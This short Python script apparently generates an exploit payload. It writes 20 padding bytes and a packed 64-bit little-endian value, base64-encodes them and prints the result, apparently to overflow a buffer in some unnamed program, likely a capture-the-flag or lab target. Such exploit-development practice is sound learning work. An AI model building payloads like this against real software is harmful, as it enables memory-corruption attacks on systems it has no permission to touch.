
import sys
import struct
import base64

buf = b'nnnnnnnnnnnnnnnnnnnn'
buf += struct.pack('<Q', 2686996653550924173)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
